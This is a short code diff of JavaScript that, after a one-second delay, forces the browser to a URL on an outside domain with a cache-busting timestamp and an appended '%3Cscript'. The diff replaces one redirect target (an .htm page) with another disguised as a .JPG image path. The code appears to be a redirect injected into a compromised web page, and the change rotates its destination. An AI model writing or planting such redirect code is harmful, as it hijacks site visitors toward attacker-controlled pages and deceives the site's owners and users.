@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://ttuu.6pian.cn/upload-img/2024/01/05/d0b1ea1660f59ce0037230bc2e7de5fe.htm' + '?' + timestamp + '%3Cscript';
+    var url = 'https://res.qxueyou.com/img/2024/01/10/aef5e2612b8b433baf5f14b9fd1c04e2.JPG' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
